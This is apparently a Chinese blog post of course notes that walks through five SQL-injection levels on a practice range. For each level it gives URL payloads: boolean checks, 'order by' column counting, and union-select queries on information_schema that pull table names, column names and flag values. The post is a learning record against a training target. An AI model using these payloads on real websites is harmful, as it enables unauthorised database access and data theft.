        <p>掌控公开课——SQL注入</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">靶场一：</span><br><span class="line">http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-01&#x2F;index.php?id&#x3D;1</span><br><span class="line">看到URL id参数，并且知道数据库查询语句是select *from user where id&#x3D;1所以构造</span><br><span class="line">select * from user where id &#x3D;1 and 1 &#x3D; 1 有结果</span><br><span class="line">select * from user where id &#x3D;1 and 1 &#x3D; 2 没结果  判断是注入点</span><br><span class="line">因为之后会用联合查询所以需要判断字段数：构造http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-01&#x2F;index.php?id&#x3D;1 order by 1（2...）最后发现order by 4 没有结果 所以字段数是3</span><br><span class="line">尝试去判断当前数据库的名字：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-01&#x2F;index.php?id&#x3D;1 and 1 &#x3D; 2 union select database(),version(),1发现数据库名显示不出来，思考id不显示在结果中因此换顺序就可以，得到数据库名 error</span><br><span class="line">尝试去找到当前的表名 http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-01&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,2,table_name from information_schema.tables where table_schema &#x3D; &#39;error&#39; limit 0,1(1,1\2,1\3,1)  3,1无结果</span><br><span class="line">		得到表名：error_flag、user、</span><br><span class="line">找字段：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-01&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,2,column_name from information_schema.columns where table_name &#x3D; &#39;error_flag&#39; and table_schema &#x3D; &#39;error&#39; limit 0,1（1,1\2,1）2,1无结果</span><br><span class="line">	error 字段 id 、flag    </span><br><span class="line">查flag数据：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-01&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,2,flag from error_flag</span><br><span class="line">	  拿到flag：zKaQ-Nf、zKaQ-BJY、zKaQ-XiaoFang、zKaq-98K</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">靶场二：</span><br><span class="line">http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-02&#x2F;index.php?id&#x3D;1</span><br><span class="line">数据库查询语句：select *from user where id&#x3D;&#39;1&#39; 因此构造</span><br><span class="line">select * from user where id &#x3D;1&#39; and &#39;1&#39; &#x3D; &#39;1 有结果 或者 select * from user where id &#x3D;1&#39; and 1 &#x3D; 1 -- 这里必须有空格（ ）</span><br><span class="line">select * from user where id &#x3D;1&#39; and &#39;1&#39; &#x3D; &#39;2 无结果 或者 select * from user where id &#x3D;1&#39; and 1 &#x3D; 2 -- 这里必须有空格（ ）所以存在注入点</span><br><span class="line">判断字段数    http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-02&#x2F;index.php?id&#x3D;1 order by 1 -- （2，3，4）所以3个字段数</span><br><span class="line">判断表名：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-02&#x2F;index.php?id&#x3D;&#39;1&#39; and 1&#x3D;2 union select 1,2,table_name from information_schema.tables where table_schema &#x3D; database() -- </span><br><span class="line">	得到表名字 error_flag</span><br><span class="line">bao字段：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-02&#x2F;index.php?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,column_name from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; &#39;error_flag&#39; limit 0,1(1,1) -- </span><br><span class="line">	字段：id&#x2F;flag</span><br><span class="line">查flag数据：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-02&#x2F;index.php?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,flag from error_flag -- </span><br><span class="line">	flag: zKaQ-Nf、zKaQ-BJY、zKaQ-XiaoFang、zKaq-98K</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">靶场三：</span><br><span class="line">http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-03&#x2F;index.php?id&#x3D;1</span><br><span class="line">数据库查询语句：select *from user where id&#x3D;(&#39;1&#39;) 因此构造</span><br><span class="line">select *from user where id&#x3D;(&#39;1&#39;) and 1&#x3D;1 --  有结果		select *from user where id&#x3D;(&#39;1&#39; and 1&#x3D;1) -- </span><br><span class="line">select *from user where id&#x3D;(&#39;1&#39;) and 1&#x3D;2 --  无结果  是注入点	select *from user where id&#x3D;(&#39;1&#39; and 1&#x3D;2) -- </span><br><span class="line">字段数： http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-03&#x2F;index.php?id&#x3D;1&#39; ) order by 1 (2,3,4)--    字段数为3</span><br><span class="line">表名： http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-03&#x2F;index.php?id&#x3D;1&#39;) and 1&#x3D;2 union select 1,2,table_name from information_schema.tables where table_schema &#x3D; database() --  	error_flag</span><br><span class="line">字段： http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-03&#x2F;index.php?id&#x3D;1&#39;) and 1&#x3D;2 union select 1,2,column_name from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; &#39;error_flag&#39; -- 	id&#x2F;flag</span><br><span class="line">数据： http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-03&#x2F;index.php?id&#x3D;1&#39;) and 1&#x3D;2 union select 1,2,flag from error_flag -- 		flag: zKaQ-Nf、zKaQ-BJY、zKaQ-XiaoFang、zKaq-98K</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">靶场四：</span><br><span class="line">http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-04&#x2F;index.php?id&#x3D;1</span><br><span class="line">数据库查询语句：select *from user where id&#x3D;(&quot;1&quot;) 因此构造</span><br><span class="line">select * from user where id &#x3D; (&quot;1&quot;) and 1&#x3D;1 --</span><br><span class="line">select * from user where id &#x3D; (&quot;1&quot;) and 1&#x3D;2 --  可以注入</span><br><span class="line">判断字段数：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-04&#x2F;index.php?id&#x3D;1&quot;) order by 1 --		 3个</span><br><span class="line">表名：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-04&#x2F;index.php?id&#x3D;1&quot;) and 1 &#x3D;2 union select 1,2,table_name from information_schema.tables where table_schema &#x3D; database() --		error_flag</span><br><span class="line">字段：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-04&#x2F;index.php?id&#x3D;1&quot;) and 1 &#x3D;2 union select 1,2,column_name from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; &#39;error_flag&#39; --	flag</span><br><span class="line">数据：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-04&#x2F;index.php?id&#x3D;1&quot;) and 1 &#x3D;2 union select 1,2,flag from error_flag -- 		flag: zKaQ-Nf、zKaQ-BJY、zKaQ-XiaoFang、zKaq-98K</span><br><span class="line">      </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">靶场五：</span><br><span class="line">http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-10&#x2F;index.php?id&#x3D;1</span><br><span class="line">查询语句：select *from news where id&#x3D;1   </span><br><span class="line">select * from user where id &#x3D;1 and 1 &#x3D; 1 有结果</span><br><span class="line">select * from user where id &#x3D;1 and 1 &#x3D; 2 没结果  判断是注入点</span><br><span class="line">构造http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-10&#x2F;index.php?id&#x3D;1 order by 1（2...）  字段数2</span><br><span class="line">http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-10&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,length(str)table_name from information_schema.tables where table_schema &#x3D; database() limit 0,1</span><br></pre></td></tr></table></figure>
